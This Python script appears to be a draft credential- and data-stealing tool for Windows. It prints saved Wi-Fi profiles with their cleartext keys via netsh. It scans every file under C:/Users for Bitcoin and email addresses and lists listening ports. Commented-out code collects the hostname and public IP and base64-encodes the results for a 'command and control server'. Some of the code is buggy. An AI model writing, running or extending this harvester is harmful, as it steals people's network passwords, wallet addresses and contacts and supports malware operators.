# Importing the Suboprocess module
import subprocess
import os
import socket
import base64
import requests
import re
import json
bitcoin_addresses_list = []
email_addresses_list = []
ports = []
# running command
def get_wifi():
    print("Gathering wifi infomation")
    command = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in command if "All User Profile" in i]
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            #print ("{:<30}|  {:<}".format(i, results[0]))
            trim=("{:<30}|  {:<}".format(i, results[0]))
            print(trim)
        except IndexError:
            print ("{:<30}|  {:<}".format(i, ""))
    return trim
def main():

    '''# get hostname of the machine
    hostname = socket.gethostname()

    # get the puvlic ipv4 address of the machine
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
    }
    public_ip = requests.get("https://ipapi.co/ip", headers = headers).text
'''
    # search for bitcoin and email addresses
    #for root, subdirs, files in os.walk("/Users"):
    for Users,subdirs, files in os.walk("C:/Users"):
        for file in files:
            #file_fdx = open("{}/{}".format(root, file), "r")
            file_fdc = open("{}/{}".format(Users, file), "r")
            #file_fd = file_fdc + file_fdx
            try:
                # read the contents of each file

                file_contents = file_fdc.read().strip()

                # search for bitcoin addresses
                bitcoin_addresses = re.findall(r"([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})", file_contents)
                # search for email addresses
                email_addresses = re.findall(r"[a-z0-9._]+@[a-z0-9]+\.[a-z]{1,7}", file_contents)
                # check if we have found any bitcoin addresses or emails
                for groups in bitcoin_addresses:
                    #bitcoin_addresses_list = bitcoin_addresses_list + bitcoin_addresses
                    bitcoin_addresses_list.append(groups)
                for groups in email_addresses:
                    #email_addresses_list = email_addresses_list + email_addresses
                    email_addresses_list.append(groups)
                    print(email_addresses_list)
            except:
                #print("Problem retrieving information")
                pass
def openports():
    output = os.popen('netstat -aonpr TCP').read()
    lines = output.strip().split('\n')
    for line in lines:
        if 'LISTENING' in line:
            parts = line.split()
            local_address = parts[1]
            pid = parts[4]
            #_, port = local_address.rsplit(':',1)
            port = local_address.partition(':').__getitem__(2)
            ports.append(port)
            c=(port,pid)
            print(ports)
    return c

    # encode data to json and send them to command and control server
#data = {
    #"machine_hostname": hostname,
    #"machine_ip": public_ip,
    #"machine_open_ports:", ports,
   # "bitcoin_addresses_found:", bitcoin_addresses_list,
    #"email_addresses_found:", email_addresses_list
#}

# base64 encode the json data
#encoded_data = base64.b64encode(json.dumps(data).encode())
#print(data)
get_wifi()
main()
